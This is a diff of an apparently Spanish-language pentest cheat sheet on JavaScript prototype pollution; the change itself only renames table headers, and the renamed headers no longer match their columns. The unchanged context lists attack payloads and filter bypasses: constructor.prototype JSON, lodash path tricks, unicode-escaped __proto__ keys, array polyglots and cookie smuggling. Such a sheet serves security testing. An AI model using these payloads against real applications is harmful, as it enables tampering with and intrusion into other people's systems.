@@ -20,7 +20,7 @@ linked:
 
 ## `__proto__` Blocked → `constructor.prototype`
 
-| **Filter** | **Bypass** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Filter `__proto__` literal | Usar `constructor.prototype` | Equivalente — modifica prototype también. |
 | Payload constructor | `{"constructor":{"prototype":{"polluted":"yes"}}}` | Standard bypass. |
@@ -38,7 +38,7 @@ ___
 
 ## Notación Bracket vs Dot
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Dot notation (lodash set) | `_.set(obj, '__proto__.polluted', 'yes')` | Default. |
 | Bracket array notation | `_.set(obj, ['__proto__','polluted'], 'yes')` | Bypass de filter en string parsing. |
@@ -56,7 +56,7 @@ ___
 
 ## JSON Encoding Tricks
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Unicode escape | `{"\\u005f\\u005fproto\\u005f\\u005f":{"x":"y"}}` | `_` = `_`. |
 | Hex escape JSON | NO existe — JSON solo soporta `\u` | (incorrect; safe). |
@@ -74,7 +74,7 @@ ___
 
 ## Array vs Object Polyglot
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Array index `__proto__` | `[1,2,{"__proto__":{"x":"y"}}]` | Inside array element. |
 | Array as top-level | `[{"__proto__":{"x":"y"}}]` | Array root. |
@@ -91,7 +91,7 @@ ___
 
 ## Header / Cookie Smuggling
 
-| **Variante** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Cookie con `__proto__` | `Cookie: __proto__=...` | Si lib parsing es vulnerable. |
 | Cookie nested | `Cookie: obj=__proto__:value` | Custom parsers. |
